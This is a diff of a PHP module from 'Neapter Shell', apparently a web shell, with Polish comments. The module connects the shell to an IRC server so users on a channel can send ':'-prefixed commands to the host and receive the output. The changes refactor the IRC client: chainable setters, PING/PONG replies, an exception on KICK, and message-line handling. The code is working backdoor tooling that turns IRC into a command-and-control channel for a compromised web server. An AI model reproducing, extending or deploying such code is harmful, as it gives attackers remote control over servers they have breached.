@@ -4,24 +4,30 @@
  * Neapter Shell
  *
  * @author    Krzysztof Otręba <krzotr@gmail.com>
- * @copyright Copyright (c) 2011, Krzysztof Otręba
+ * @copyright Copyright (c) 2012, Krzysztof Otręba
  *
  * @license   http://www.gnu.org/licenses/gpl-3.0.txt
  */
 
 /**
- * Class IrcException - Irc wyjatki
+ * Irc - Wyjatki
  *
  * @author    Krzysztof Otręba <krzotr@gmail.com>
- * @copyright Copyright (c) 2011, Krzysztof Otręba
+ * @copyright Copyright (c) 2012, Krzysztof Otręba
+ *
+ * @package    NeapterShell
+ * @subpackage Tools\Exception
  */
 class IrcException extends Exception {}
 
 /**
- * Class Irc - Laczenie sie z serwerem IRC
+ * Podlaczenie sie do kanalu Irc
  *
  * @author    Krzysztof Otręba <krzotr@gmail.com>
- * @copyright Copyright (c) 2011, Krzysztof Otręba
+ * @copyright Copyright (c) 2012, Krzysztof Otręba
+ *
+ * @package    NeapterShell
+ * @subpackage Tools
  */
 class Irc
 {
@@ -61,7 +67,7 @@ class Irc
 	 *
 	 * @access public
 	 * @param  string $sValue Host:Port
-	 * @return void
+	 * @return object         Obiekt Irc
 	 */
 	public function setHost( $sValue )
 	{
@@ -69,10 +75,12 @@ class Irc
 
 		if( ctype_digit( $iPort ) )
 		{
-			$this -> aConfig['port'] = $iPort;
+			$this -> aConfig['port'] = (int) $iPort;
 		}
 
-		$this -> aConfig['host'] = $sValue;
+		$this -> aConfig['host'] = (string) $sValue;
+
+		return $this;
 	}
 
 	/**
@@ -80,7 +88,7 @@ class Irc
 	 *
 	 * @access public
 	 * @param  string $sValue Kanal
-	 * @return void
+	 * @return object         Obiekt Irc
 	 */
 	public function setChannel( $sValue )
 	{
@@ -89,7 +97,9 @@ class Irc
 			$sValue = '#' . $sValue;
 		}
 
-		$this -> aConfig['channel'] = $sValue;
+		$this -> aConfig['channel'] = (string) $sValue;
+
+		return $this;
 	}
 
 	/**
@@ -97,11 +107,13 @@ class Irc
 	 *
 	 * @access public
 	 * @param  string $sValue Haslo
-	 * @return void
+	 * @return object         Obiekt Irc
 	 */
 	public function setPassword( $sValue )
 	{
-		$this -> aConfig['password'] = $sValue;
+		$this -> aConfig['password'] = (string) $sValue;
+
+		return $this;
 	}
 
 	/**
@@ -109,23 +121,35 @@ class Irc
 	 *
 	 * @access public
 	 * @param  string $sValue Host:Port
-	 * @return void
+	 * @return object         Obiekt Irc
 	 */
 	public function setNick( $sValue )
 	{
-		$this -> aConfig['nick'] = $sValue;
+		$this -> aConfig['nick'] = (string) $sValue;
+
+		return $this;
 	}
 
 	/**
 	 * Ustawianie funkcji zwrotnej
 	 *
+	 * Funkcja zwrotna przyjmuje nastepujace parametry
+	 *     object $oIrc   - Obiekt Irc
+	 *     array $aConfig - Konfiguracja polaczenia z Irc
+	 *     array $aData   - Dane pochodzace z Irc, klucze:
+	 *         'type'     - public/private - Typ wiadomosci ktora otrzymal klient irc
+	 *         'nick'     - Nazwa uzytkownika, ktory wyslal wiadomosc
+	 *         'message'  - Wiadomosc od uzytkownika
+	 *
 	 * @access public
 	 * @param  string $sValue Host:Port
-	 * @return void
+	 * @return object         Obiekt Irc
 	 */
 	public function setCallback( $sValue )
 	{
 		$this -> sCallback = $sValue;
+
+		return $this;
 	}
 
 	/**
@@ -164,8 +188,18 @@ class Irc
 
 		fwrite( $this -> rSock, sprintf( "NICK %s\r\nUSER %s %s %s :%s\r\n", $this -> aConfig['nick'], $this -> aConfig['nick'], $this -> aConfig['nick'], $this -> aConfig['host'], $this -> aConfig['nick'] ) );
 
-		while( strpos( fgets( $this -> rSock ), sprintf( ':%s MODE %s :+i', $this -> aConfig['nick'], $this -> aConfig['nick'] ) ) === FALSE )
+		while( ( strpos( $sData = fgets( $this -> rSock ), sprintf( ':%s MODE %s :+i', $this -> aConfig['nick'], $this -> aConfig['nick'] ) ) === FALSE ) && ! empty( $sData ) )
 		{
+			/**
+			 * PING - PONG
+			 */
+			if( strncmp( $sData, 'PING', 4 ) === 0 )
+			{
+				$sPinger = rtrim( substr( $sData, 5 ) );
+				fwrite( $this -> rSock, sprintf( "PONG %s\r\n", $sPinger ) );
+				continue ;
+			}
+
 			usleep( 10000 );
 		}
 
@@ -192,7 +226,7 @@ class Irc
 			if( strncmp( $sData, 'PING', 4 ) === 0 )
 			{
 				$sPinger = rtrim( substr( $sData, 5 ) );
-				fwrite( $this -> rSock, sprintf( ':%s PONG %s :%s', $sPinger, $sPinger, $sPinger ) );
+				fwrite( $this -> rSock, sprintf( ":%s PONG %s :%s\r\n", $sPinger, $sPinger, $sPinger ) );
 				continue ;
 			}
 
@@ -200,7 +234,6 @@ class Irc
 			{
 				continue ;
 			}
-			print_r( $aData );
 
 			list( $NULL, $sFrom, $sIp, $sOption, $sTo, $sMessage ) = $aData;
 
@@ -211,7 +244,7 @@ class Irc
 			 */
 			if( $sOption === 'KICK' )
 			{
-				exit ;
+				throw new IrcException( 'Klient został wyrzucony z serwera' );
 			}
 
 			/**
@@ -252,15 +285,20 @@ class Irc
 	 */
 	public function sendMessage( $sType, $sMsg, $sNick = NULL )
 	{
-		$aData = preg_split( '~\r\n|\r|\n~', $sMsg );
+		if( trim( $sMsg ) === '' )
+		{
+			return ;
+		}
 
-		if( ( $iCount = count( $aData ) ) > 15 )
+		$aMessageLines = preg_split( '~\r\n|\r|\n~', rtrim( $sMsg, "\r\n" ) );
+
+		if( ( $iCount = count( $aMessageLines ) ) > 15 )
 		{
 			fwrite( $this -> rSock, sprintf( "PRIVMSG %s :Ocipiałeś? Wynik ma %d linii !!!\r\n", ( ( $sType === 'public' ) ? $this -> aConfig['channel'] : $sNick ), $iCount ) );
 			return ;
 		}
 
-		foreach( $aData as $sMessage )
+		foreach( $aMessageLines as $sMessage )
 		{
 			fwrite( $this -> rSock, sprintf( "PRIVMSG %s :%s\r\n",  ( ( $sType === 'public' ) ? $this -> aConfig['channel'] : $sNick ), $sMessage ) );
 
@@ -291,21 +329,16 @@ class Irc
  */
 
 /**
- * ModuleIrc - Irc
+ * Podlaczenie sie do kanalu Irc
  *
  * @author    Krzysztof Otręba <krzotr@gmail.com>
- * @copyright Copyright (c) 2011, Krzysztof Otręba
+ * @copyright Copyright (c) 2012, Krzysztof Otręba
+ *
+ * @package    NeapterShell
+ * @subpackage Modules
  */
-class ModuleIrc implements ShellInterface
+class ModuleIrc extends ModuleAbstract
 {
-	/**
-	 * Obiekt Shell
-	 *
-	 * @access private
-	 * @var    object
-	 */
-	private $oShell;
-
 	/**
 	 * Obiekt Shell
 	 *
@@ -324,7 +357,7 @@ class ModuleIrc implements ShellInterface
 	 */
 	public function __construct( Shell $oShell )
 	{
-		$this -> oShell = $oShell;
+		parent::__construct( $oShell );
 
 		self::$oShelll = $oShell;
 	}
@@ -351,7 +384,7 @@ class ModuleIrc implements ShellInterface
 		/**
 		 * Wersja Data Autor
 		 */
-		return '1.00 2011-06-23 - <krzotr@gmail.com>';
+		return '1.01 2012-11-10 - <krzotr@gmail.com>';
 	}
 
 	/**
@@ -373,11 +406,25 @@ class ModuleIrc implements ShellInterface
 
 	Dostępne polecenia, gdy shell połączony jest z serwerem:
 		:exit   - zakończenie pracy shella (wymaga potwierdzenia)
+		:exit 11111111112222222222333333333344 - zakończenie pracy szela
+
 		:ircmgs - wysłanie surowej wiadomośći
 			':ircmgs KICK #kanal nick' - wyrzucenie użytkownika 'nick' z kanału '#kanal'
 DATA;
 	}
 
+	/**
+	 * Parsowanie wiadomosci
+	 *
+	 * @see   Irc::setCallback
+	 *
+	 * @static
+	 * @access public
+	 * @param  object $oIrc    Obiekt Irc
+	 * @param  array  $aConfig Konfiguracja polaczenia z Irc
+	 * @param  array  $aData   Dane pochodzace z Irc, klucze:
+	 * @return void
+	 */
 	public static function parseMessage( $oIrc, $aConfig, $aData )
 	{
 		static $sCaptcha;
@@ -392,7 +439,7 @@ DATA;
 		/**
 		 * Polecenie zaczynajace sie od ':'
 		 */
-		if( preg_match( '~^:[a-z][a-z0-9]{1,}~', $aData['message'] ) )
+		else if( preg_match( '~^:[a-z][a-z0-9]{1,}~', $aData['message'] ) )
 		{
 			$aMessageData = array();
 
@@ -477,10 +524,11 @@ DATA;
 		try
 		{
 			$oIrc = new Irc();
-			$oIrc -> setHost( $this -> oShell -> aArgv[0] );
-			$oIrc -> setNick( $this -> oShell -> aArgv[1] );
-			$oIrc -> setChannel( $this -> oShell -> aArgv[2] );
-			$oIrc -> setCallback( 'ModuleIrc::parseMessage' );
+			$oIrc
+			      -> setHost( $this -> oShell -> aArgv[0] )
+			      -> setNick( $this -> oShell -> aArgv[1] )
+			      -> setChannel( $this -> oShell -> aArgv[2] )
+			      -> setCallback( 'ModuleIrc::parseMessage' );
 
 			if( isset( $this -> oShell -> aArgv[3] ) )
 			{
